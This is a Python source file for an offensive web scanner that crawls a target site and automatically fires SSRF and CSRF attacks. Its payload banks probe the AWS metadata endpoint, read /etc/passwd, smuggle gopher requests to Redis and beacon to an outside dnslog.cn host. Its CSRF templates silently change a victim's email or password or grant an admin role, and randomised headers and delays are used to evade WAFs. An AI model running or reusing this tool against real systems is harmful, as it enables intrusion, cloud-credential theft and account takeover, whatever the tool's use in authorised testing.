#!/usr/bin/env python3
# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
# â•‘ CSRFÂ |Â XSRFÂ |Â SSRF Redâ€‘TeamÂ Scanner v3.0                                 â•‘
# â•‘ AuthorÂ :Â HaroonÂ AhmadÂ AwanÂ Â·Â CyberZeusÂ Â (haroon@cyberzeus.pk)Â Â Â Â Â Â Â Â Â Â   â•‘
# â•‘ Licence:Â MITÂ Â (For *authorised* security testing & research only)Â Â Â Â Â Â   â•‘
# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Â 1)Â ImportsÂ &Â basicÂ setup
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
import os, re, sys, ssl, time, random, string, logging, warnings, argparse
import urllib.parse
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
import requests, bs4                                   # HTML parsing
from fake_useragent import UserAgent                   # Fresh Userâ€‘Agents
from playwright.sync_api import sync_playwright        # Headless browser

warnings.filterwarnings("ignore")
ssl._create_default_https_context = ssl._create_unverified_context

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Â 2)Â GlobalÂ constants
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
VERSION          = "3.0"
DNSLOG_SUB       = f"ssrf{random.randint(1000,9999)}"
DNSLOG_DOMAIN    = "1mslqu.dnslog.cn"           # outâ€‘ofâ€‘band SSRF beacon
LOGFILE          = Path("bandesbahan_findings.md")
TIMEOUT_REQ      = 8                                   # seconds for HTTP req
HEADLESS_WAIT    = 2500                                # ms wait after render
DEFAULT_THREADS  = 14
MAX_PAGES        = 180

MS_TAGS = {                                            # STRIDEâ€‘aligned labels
    "CSRF": ["Tampering", "Repudiation"],
    "SSRF": ["Information Disclosure", "Elevation of Privilege"]
}

logging.basicConfig(level=logging.INFO, format="%(message)s")
UA = UserAgent()                                       # random UA generator

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Â 3)Â CLIÂ flags
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
cli = argparse.ArgumentParser(
    description="bandesbahan Î©â€‘Edition â€“ Unified CSRF / XSRF / SSRF Scanner")
cli.add_argument("-u","--url", required=True,
                 help="Target root (e.g. https://vuln.lab)")
cli.add_argument("--threads", type=int, default=DEFAULT_THREADS,
                 help="Worker threads (default 14)")
cli.add_argument("--max-pages", type=int, default=MAX_PAGES,
                 help="Crawler cap (default 180)")
cli.add_argument("--stealth", action="store_true", default=True,
                 help="Enable adaptive WAF delays (default on)")
cli.add_argument("--no-stealth", action="store_false", dest="stealth",
                 help="Disable delays, run flatâ€‘out")
cli.add_argument("--debug", action="store_true")
ARGS   = cli.parse_args()
DEBUG  = ARGS.debug
if DEBUG: logging.getLogger().setLevel(logging.DEBUG)

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Â 4)Â PayloadÂ banks
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
SSRF_PAYLOADS = [
    # Internal / cloud
    "http://127.0.0.1", "http://localhost", "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",          # AWS creds
    "http://10.0.0.1", "http://192.168.1.1",
    "http://internal-service.default.svc.cluster.local", # k8s
    # DNS beacon â€“ check dnslog.cn panel
    f"http://{DNSLOG_DOMAIN}",
    # Protocol smuggling
    "gopher://127.0.0.1:6379/_PING",
    "file:///etc/passwd"
]

CSRF_TEMPLATES = [
    # Classic POST form
    """<form action="{t}" method="POST"><input name=change_email value=h@cked>
    </form><script>document.forms[0].submit()</script>""",
    # Iframe autoâ€‘submit
    """<iframe srcdoc='<form action="{t}" method="POST">
       <input name=password value=newpass123></form>
       <script>document.forms[0].submit()</script>'></iframe>""",
    # GET CSRF
    """<img src="{t}?reset=true">""",
    # fetch() JSON CSRF
    """<script>fetch("{t}",{method:"POST",credentials:"include",
      headers:{{"Content-Type":"application/x-www-form-urlencoded"}},
      body:"role=admin"})</script>""",
    # Contentâ€‘Type: text/plain token bypass
    """<form action="{t}" method="POST" enctype="text/plain">
       <input name=admin value=1></form>
       <script>document.forms[0].submit()</script>"""
]

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Â 5)Â HelperÂ functions
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
def hdrs():
    """Return randomised headers for each request."""
    return {
        "User-Agent": UA.random,
        "Referer": random.choice(["https://google.com","https://bing.com"]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

def adaptive_sleep(status:int|None)->None:
    """AIâ€‘style backâ€‘off to dodge WAF / rate limits."""
    if not ARGS.stealth: return
    rng = (0.8,2.5)
    if status in {403,429,503}: rng = (10,20)
    elif status in {301,302}:   rng = (3,6)
    time.sleep(random.uniform(*rng))

def smart_url(b:str)->str:
    """Force HTTPS first; fall back to HTTP."""
    if b.startswith("http"): return b
    for s in ("https://","http://"):
        try:
            if requests.head(s+b,timeout=4).ok: return s+b
        except: pass
    return "http://"+b

def md_log(kind:str, url:str, payload:str,
           status:str, reason:str, conf:float)->None:
    """Write one finding line into the Markdown report."""
    tags = ", ".join(MS_TAGS.get(kind, []))
    entry = (f"- **{kind}** `{url}`\n"
             f"  - Status : {status}  (confidence {conf:.2f})\n"
             f"  - Reason : {reason}\n"
             f"  - Payload: `{payload[:80]}`\n"
             f"  - Tags   : {tags}\n")
    LOGFILE.parent.mkdir(exist_ok=True)
    with open(LOGFILE,"a",encoding="utf-8") as f: f.write(entry)
    logging.info(entry.strip().replace("\n  ","  "))

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Â 6)Â Crawler â€“Â links, forms, JS endpoints
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
_JS_URL = re.compile(
    r'(?:fetch\(|axios\.(?:get|post)\(|XMLHttpRequest\(.+?open\()'
    r'\s*["\']([^"\']+)["\']', re.I)

def crawl(root:str, cap:int):
    seen, queue, targets = set(), [root], []
    domain = urllib.parse.urlparse(root).netloc
    while queue and len(seen) < cap:
        url = queue.pop(0)
        seen.add(url)
        try:
            r = requests.get(url, headers=hdrs(), timeout=TIMEOUT_REQ)
            adaptive_sleep(r.status_code)
            if "text/html" not in r.headers.get("Content-Type",""): continue
        except: continue

        soup = bs4.BeautifulSoup(r.text,"html.parser")

        # Â a)Â <aÂ href>
        for a in soup.find_all("a",href=True):
            full = urllib.parse.urljoin(url,a["href"])
            if urllib.parse.urlparse(full).netloc == domain and full not in seen:
                queue.append(full)
            if "?" in full:
                p = urllib.parse.urlparse(full)
                qs= list(urllib.parse.parse_qs(p.query))
                if qs: targets.append({"url":p._replace(query="").geturl(),
                                       "method":"GET","params":qs})

        # Â b)Â <form>
        for f in soup.find_all("form"):
            act=urllib.parse.urljoin(url,f.get("action") or url)
            if urllib.parse.urlparse(act).netloc != domain: continue
            names=[i.get("name") for i in f.find_all("input",{"name":True})]
            if names:
                targets.append({"url":act,"method":f.get("method","GET").upper(),
                                "params":names})

        # Â c)Â JSâ€‘defined endpoints
        for u in _JS_URL.findall(r.text):
            full=urllib.parse.urljoin(url,u)
            if urllib.parse.urlparse(full).netloc==domain and "?" in full:
                p=urllib.parse.urlparse(full); qs=list(urllib.parse.parse_qs(p.query))
                if qs: targets.append({"url":p._replace(query="").geturl(),
                                       "method":"GET","params":qs})
    return targets

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Â 7)Â CSRF verifier (headless Firefox)
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
def verify_csrf(html:str)->bool:
    try:
        with sync_playwright() as p:
            b=p.firefox.launch(headless=True,args=["--no-sandbox"])
            ctx=b.new_context(); pg=ctx.new_page()
            pg.set_content(html,wait_until="domcontentloaded")
            pg.wait_for_timeout(HEADLESS_WAIT)
            ok="captcha" not in pg.content().lower()
            ctx.close(); b.close(); return ok
    except: return False

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Â 8)Â TheÂ actualÂ scanner
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
def scan(target):
    url,method,params = target["url"],target["method"],target["params"]

    #Â A)Â SSRF fuzz
    for pl in SSRF_PAYLOADS:
        data={p:pl for p in params}
        try:
            r=(requests.get if method=="GET" else requests.post)(
                url, params=data if method=="GET" else None,
                data=data   if method=="POST" else None,
                headers=hdrs(), timeout=TIMEOUT_REQ)
            adaptive_sleep(r.status_code)
            body=r.text.lower()
        except:
            adaptive_sleep(None)
            continue

        # evidence scoring
        if "root:x" in body:
            md_log("SSRF",url,pl,"Confirmed","/etc/passwd snippet",0.95); return
        if "localhost" in body:
            md_log("SSRF",url,pl,"Confirmed","string 'localhost' reflected",0.80);return
        if DNSLOG_DOMAIN in pl:
            md_log("SSRF",url,pl,"Suspected","Blind beacon â€“Â check dnslog.cn",0.50)

    #Â B)Â CSRF / XSRF fuzz (POST only)
    if method=="POST":
        for tpl in CSRF_TEMPLATES:
            html=tpl.format(t=url)
            if verify_csrf(html):
                reason="Form autoâ€‘submitted â€“ verify serverâ€‘side effect"
                md_log("CSRF",url,html.strip(),"Suspected",reason,0.60);return

# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Â 9)Â MainÂ routine
# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
def main():
    root=smart_url(ARGS.url.rstrip("/"))
    if not LOGFILE.exists():
        LOGFILE.write_text(f"# bandesbahan Findings v{VERSION}\n\n","utf-8")
    logging.info(f"ğŸ”¥ bandesbahan Î©â€‘Edition {VERSION}")
    logging.info(f"[Â»] Crawl start â†’ {root}")
    targets=crawl(root,ARGS.max_pages)
    logging.info(f"[+] Identified {len(targets)} fuzzable endpoints\n")

    with ThreadPoolExecutor(max_workers=ARGS.threads) as pool:
        pool.map(scan,targets)

    logging.info(f"[âœ“] Done â€“ report â†’ {LOGFILE.resolve()}")
    logging.info(f"[i] Blindâ€‘SSRF beacons used dnslog host â†’ {DNSLOG_DOMAIN}")

if __name__=="__main__":
    main()
